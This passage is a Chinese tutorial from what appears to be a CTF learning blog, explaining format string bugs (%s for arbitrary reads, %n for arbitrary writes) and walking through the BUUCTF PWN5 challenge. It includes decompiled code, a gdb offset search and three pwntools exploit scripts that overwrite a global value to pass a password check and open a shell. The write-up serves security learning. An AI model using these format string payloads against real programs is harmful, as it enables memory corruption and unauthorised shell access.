<p>要想获取任意地址的数据，我们需要先在栈上写入目标地址（有许多方法可以达到这一目的，需要根据题目的条件决定），随后将其作为%s的参数传入。这时，我们就能获取目标地址的数据。</p>
<h3 id="8d4b2282"><font style="color:rgb(25, 27, 31);">向目标地址写入数据</font></h3>
printf 的 %n 格式化符可用于向指定地址写入数据。

<p>如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0123456789%n\n&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value of a is %d&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0123456789</span><br><span class="line">The value of a is 10</span><br></pre></td></tr></table></figure>



<p>可以看到，a的值被修改为了10。这是因为printf(“0123456789%n\n”, &amp;a)中%n前已经成功输出了”0123456789”共计10个字节，因此%n便会将10写入目标地址中。</p>
<p>可以看到，%n会将其对应的参数作为地址解析。因此只要我们向栈上写入目标地址，再使用%n即可向目标地址写入数据。</p>
<p><font style="color:rgb(25, 27, 31);">值得注意的是，若将上述代码改为：</font></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">char</span> b = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%20c%n&quot;</span>, b, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The value of a is %d&quot;</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(25, 27, 31);">这时a的值将变为20。这是因为%20c在字符b的左侧填充了19个空格，再加上b本身是一个字节，共计20个字节。</font></p>
<p><font style="color:rgb(25, 27, 31);">也就是说，当我们需要写入的数据（假定为k + 1）特别大时，可以使用%kc%n代替。</font></p>
<p>而下面的代码缺少第2个参数，则会将 10 写入栈中”0123456789%n\n”上面一格内容x对应的内存M[x]</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0123456789%n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="FwXIs">例题</h2>
buuctf-[第五空间2019 决赛]PWN5



<p>检查程序安全保护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:       i386-32-little</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>32位小端序，开启了canary保护，说明无法栈溢出。</p>
<p>IDA打开</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// [esp+0h] [ebp-84h]</span></span><br><span class="line">    <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [esp+4h] [ebp-80h] BYREF</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+14h] [ebp-70h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+78h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> *v7; <span class="comment">// [esp+7Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">    v7 = &amp;a1;</span><br><span class="line">    v6 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v1 = time(<span class="number">0</span>);</span><br><span class="line">    srand(v1);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    read(fd, &amp;dword_804C044, <span class="number">4u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x63u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your passwd:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, nptr, <span class="number">0xFu</span>);</span><br><span class="line">    <span class="keyword">if</span> ( atoi(nptr) == dword_804C044 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ok!!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14u</span>) != v6 )</span><br><span class="line">        sub_80493D0();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现格式化字符串漏洞 printf(buf)</p>
<p>该题逻辑是将 dword_804C044 中值与第二次输入的 passwd 进行校对，如果相等则执行 system(“&#x2F;bin&#x2F;sh”)，然而 dword_804C044 的值是随机的，所以我们可以通过修改 dword_804C044 的值，然后再次输入此值即可获取shell。</p>
<p>dword_804C044 地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804C044 ?? ?? ?? ??                   dword_804C044 dd ?                      ; DATA XREF: main+77↑o</span><br></pre></td></tr></table></figure>



<p>计算偏移：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /home/kali/Desktop/pwn </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">your name:aaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line">Hello,aaaa.0xffffce98.0x63.(nil).(nil).0x3.0x80482ac.0xffffceec.0xf7ffdb8c.0x1.0x61616161.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e</span><br><span class="line">your passwd:</span><br></pre></td></tr></table></figure>

<p>0x61是 a 的值，0x61616161在第十个位置，所以偏移量为10</p>
<p>EXP1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p=remote(&#x27;node5.buuoj.cn&#x27;,xxxxx)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 10</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset,&#123;0x804C044:1&#125;) # 通过 fmtstr_payload 将 dword_804C044 的内容替换为1，而非随机数    </span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;name:&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;passwd:&#x27;)</span><br><span class="line">p.sendline(str(1)) # 随后输入同样的值 1 即可通过if判断，获取shell。</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"># flag&#123;4ad36cb5-e82b-4b83-935f-0fdb38b58788&#125;</span><br></pre></td></tr></table></figure>

<p>fmtstr_payload是pwntools里面的一个工具，用来简化对格式化字符串漏洞的构造工作。  可以实现修改任意内存 fmtstr_payload(offset, {printf_got: system_addr})(偏移，{原地址：目的地址})</p>
<p>EXP2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=remote(&#x27;node5.buuoj.cn&#x27;,xxxxx)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 10</span><br><span class="line"></span><br><span class="line">payload = p32(0x0804c044)+b&#x27;%10$n&#x27;    # 向 0x804C044 写入 4</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;name:&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;passwd:&#x27;)</span><br><span class="line">p.sendline(str(4)) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>解释一下 payload &#x3D; p32(0x0804c044)+b’%10$n’ </p>
<ul>
<li>p32(0x804C044)：作用是将目标地址 0x804C044 转换为 4字节小端序 的二进制格式。</li>
<li>%10$n 会从栈上第10个参数的位置读取 0x804C044，并向该地址写入值。</li>
<li>%n 只统计 % 之前输出的字符数（即 p32(0x804C044) 的4字节）。</li>
</ul>
<p>若需写入其他值（如 100），需控制输出字符数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,xxxxx)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x804C044</span>) + <span class="string">b&#x27;%96x%10$n&#x27;</span>  <span class="comment"># 4 + 96 = 100</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">100</span>)) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="bacvK">参考：</h2>
https://zhuanlan.zhihu.com/p/465896542







































]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
